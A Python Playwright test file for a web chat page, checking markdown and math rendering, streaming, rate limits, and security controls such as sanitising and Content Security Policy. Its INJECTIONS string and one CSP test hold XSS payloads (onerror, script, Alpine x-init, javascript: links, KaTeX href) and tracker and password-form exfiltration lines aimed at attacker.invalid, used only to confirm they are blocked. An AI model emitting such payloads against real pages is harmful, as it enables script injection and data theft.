"""
Tests that drive the chat page in a real browser (Chromium, through Playwright).

They don't run by default. Install Chromium once, then select them with -m ui:
    uv run playwright install chromium
    uv run pytest -m ui
"""

import time

import pytest
from playwright.sync_api import Locator, Page, expect
from support import AUTH, code_interpreter_done, code_interpreter_started, text_delta

pytestmark = [
    pytest.mark.ui,
    pytest.mark.browser_context_args(http_credentials={"username": AUTH[0], "password": AUTH[1]}),
]

MARKDOWN = r"""**Bold**, *italic* and `code`:

- one
- two

Inline \(x^2\) and $a_1 + b_2$, displayed:

$$\frac{1}{2}$$

\[ \int_0^1 x\,dx \]

Prices like $5 and $10 stay text. [A link](https://example.com)."""

# Each attack in its own paragraph: an HTML block swallows the lines that follow it.
INJECTIONS = r"""<img src="https://attacker.invalid/a.png" onerror="window.pwned = 'img'">

<script>window.pwned = 'script'</script>

<style>body { display: none }</style>

<div x-data x-init="window.pwned = 'alpine'">alpine</div>

<p style="background: url(https://attacker.invalid/b)">styled paragraph</p>

[js link](javascript:window.pwned='link') and <a href="https://example.com" class="fixed inset-0">overlay</a>

![tracker](https://attacker.invalid/c.png)

<form action="https://attacker.invalid/d"><input name="password"></form>

$\href{javascript:window.pwned='katex'}{x}$ and $\htmlData{x-init=window.pwned='katex'}{y}$

The end."""


# Runs before the page's own scripts (Playwright injects it outside the page's CSP).
RECORD_CSP_VIOLATIONS = """
    window.cspViolations = [];
    document.addEventListener("securitypolicyviolation", (event) => {
        window.cspViolations.push(`${event.effectiveDirective} ${event.blockedURI}`);
    });
"""


def chunks(text: str, size: int = 5) -> list:
    """
    Split a reply into small deltas, so formulas arrive cut in pieces as they do live.
    """
    return [text_delta(text[i : i + size]) for i in range(0, len(text), size)]


def send(page: Page, prompt: str) -> None:
    message_box = page.get_by_placeholder("Type your message...")
    message_box.fill(prompt)
    message_box.press("Enter")


def last_reply(page: Page, ending: str) -> Locator:
    """
    Wait until the latest reply contains `ending` and the chat is ready for a new message.
    """
    reply = page.locator(".markdown").last
    expect(reply).to_contain_text(ending)
    expect(page.get_by_placeholder("Type your message...")).to_be_enabled()
    return reply


def test_replies_render_markdown_and_math(page, server_url, fake_openai):
    fake_openai.events = chunks(MARKDOWN)
    page.goto(server_url)
    send(page, "Show me some formatting")
    reply = last_reply(page, "A link")

    expect(reply.locator("strong")).to_have_text("Bold")
    expect(reply.locator("p > em")).to_have_text("italic")
    expect(reply.locator("ul > li")).to_have_count(2)
    expect(reply.locator(".katex")).to_have_count(4)
    expect(reply.locator(".katex-display")).to_have_count(2)
    expect(reply).not_to_contain_text("$$")
    expect(reply).to_contain_text("Prices like $5 and $10 stay text.")
    link = reply.get_by_role("link", name="A link")
    expect(link).to_have_attribute("target", "_blank")
    expect(link).to_have_attribute("rel", "noopener noreferrer")


def test_replies_cannot_run_code_restyle_the_page_or_leak_data(page, server_url, fake_openai):
    fake_openai.events = [text_delta(INJECTIONS)]
    requests: list[str] = []
    page.on("request", lambda request: requests.append(request.url))
    page.goto(server_url)
    send(page, "Try to break the page")
    reply = last_reply(page, "The end.")
    page.wait_for_timeout(500)  # Time for an onerror, Alpine directive or request to fire.

    assert page.evaluate("window.pwned") is None
    expect(page.locator("body")).to_be_visible()
    expect(reply.locator("img, script, style, iframe, form, input")).to_have_count(0)
    attributes = reply.evaluate("""(reply) => [...reply.querySelectorAll("*")]
            .filter((element) => !element.closest(".katex"))
            .flatMap((element) => [...element.attributes].map((attribute) => attribute.name))""")
    assert set(attributes) <= {"href", "target", "rel"}
    assert reply.locator("a", has_text="js link").get_attribute("href") is None
    expect(reply.locator(".katex a")).to_have_count(0)
    assert [url for url in requests if "attacker.invalid" in url] == []


def test_code_interpreter_logs_show_as_code(page, server_url, fake_openai):
    fake_openai.events = [
        text_delta("Running it:"),
        code_interpreter_started(),
        code_interpreter_done("# not a heading\n*not italic*"),
        text_delta("Done."),
    ]
    page.goto(server_url)
    send(page, "Run some code")
    reply = last_reply(page, "Done.")

    expect(reply.locator("pre code")).to_contain_text("# not a heading")
    expect(reply.locator("pre code")).to_contain_text("*not italic*")
    expect(reply.locator("h1, em")).to_have_count(0)


def test_stop_button_cuts_the_reply(page, server_url, fake_openai):
    fake_openai.events = [text_delta(f"token{i} ") for i in range(40)]  # 4 s in total.
    fake_openai.delay = 0.1
    page.goto(server_url)
    send(page, "Count slowly")
    reply = page.locator(".markdown").last
    expect(reply).to_contain_text("token1 ")

    page.get_by_role("button", name="Stop").click()
    expect(page.get_by_role("button", name="Stop")).to_be_hidden()
    expect(page.get_by_placeholder("Type your message...")).to_be_enabled()
    text_when_stopped = reply.inner_text()
    page.wait_for_timeout(500)
    assert reply.inner_text() == text_when_stopped  # Nothing arrives after Stop.

    stream = fake_openai.streams[0]
    deadline = time.monotonic() + 2
    while not stream.closed and time.monotonic() < deadline:
        time.sleep(0.02)
    assert stream.closed
    assert stream.sent < len(fake_openai.events)


def test_follow_up_messages_continue_the_conversation(page, server_url, fake_openai):
    page.goto(server_url)
    send(page, "First message")
    last_reply(page, "Hello there")
    send(page, "Second message")
    expect(page.locator(".markdown")).to_have_count(2)
    last_reply(page, "Hello there")

    assert fake_openai.conversations_created == 1
    assert [call["conversation"] for call in fake_openai.response_calls] == ["conv_1", "conv_1"]


def test_messages_travel_in_the_request_body(page, server_url, fake_openai):
    requests = []
    page.on("request", lambda request: requests.append(request))
    page.goto(server_url)
    send(page, "a very private question")
    last_reply(page, "Hello there")

    assert [request.url for request in requests if "private" in request.url] == []
    [chat_request] = [request for request in requests if request.url.endswith("/chat-stream")]
    assert chat_request.method == "POST"
    assert chat_request.post_data_json == {
        "prompt": "a very private question",
        "conversation_id": None,
    }


def test_message_limit_is_shown_in_the_chat(page, server_url, fake_openai):
    page.goto(server_url)
    for number in range(3):  # MESSAGES_PER_MINUTE in config.test.toml
        send(page, f"Message {number}")
        expect(page.locator(".markdown")).to_have_count(number + 1)
        last_reply(page, "Hello there")
    send(page, "One too many")
    expect(page.locator(".markdown")).to_have_count(4)
    last_reply(page, "[Error: Message limit reached. Try again in")
    assert len(fake_openai.response_calls) == 3


def test_event_reader_handles_line_breaks_split_across_chunks(page, server_url):
    page.goto(server_url)
    events = page.evaluate("""async () => {
        // "\\r\\n" cut in two, LF-only lines and a comment, as a network could deliver them.
        const chunks = ["event: conversation\\r", "\\ndata: conv_1\\r\\n\\r", "\\ndata: a\\r\\n",
                        "data: b\\n\\n", ": ping\\r\\n\\r\\n"];
        const body = new ReadableStream({
            start(controller) {
                for (const chunk of chunks) controller.enqueue(new TextEncoder().encode(chunk));
                controller.close();
            },
        });
        const events = [];
        for await (const event of readServerSentEvents(body)) events.push(event);
        return events;
    }""")
    assert events == [
        {"type": "conversation", "data": "conv_1"},
        {"type": "message", "data": "a\nb"},
    ]


def test_content_security_policy_lets_the_chat_work(page, server_url, fake_openai):
    fake_openai.events = chunks(MARKDOWN)
    page.add_init_script(RECORD_CSP_VIOLATIONS)
    page.goto(server_url)
    send(page, "Show me some formatting")
    reply = last_reply(page, "A link")

    expect(reply.locator(".katex")).to_have_count(4)  # KaTeX ran, with its styles and fonts
    page.wait_for_timeout(300)
    assert page.evaluate("window.cspViolations") == []


def test_content_security_policy_blocks_scripts_that_get_past_sanitizing(page, server_url):
    page.add_init_script(RECORD_CSP_VIOLATIONS)
    page.goto(server_url)
    # Pretend a reply slipped past DOMPurify: the browser itself must refuse to run it.
    page.evaluate("""() => {
        const messages = document.querySelector(".messages");
        messages.insertAdjacentHTML("beforeend", '<img src="x" onerror="window.pwned = 1">');
        const script = document.createElement("script");
        script.textContent = "window.pwned = 2";
        document.body.append(script);
    }""")
    page.wait_for_timeout(500)

    assert page.evaluate("window.pwned") is None
    blocked = " ".join(page.evaluate("window.cspViolations"))
    assert "script-src-attr" in blocked and "script-src-elem" in blocked


def test_page_cannot_be_embedded_in_another_site(page, server_url):
    with page.expect_response(lambda response: response.url.startswith(server_url)):
        page.set_content(f'<iframe src="{server_url}/"></iframe>')
    page.wait_for_timeout(500)
    # The browser refuses to show the chat inside the frame (frame-ancestors 'none').
    assert "AI Chat" not in page.frames[1].content()
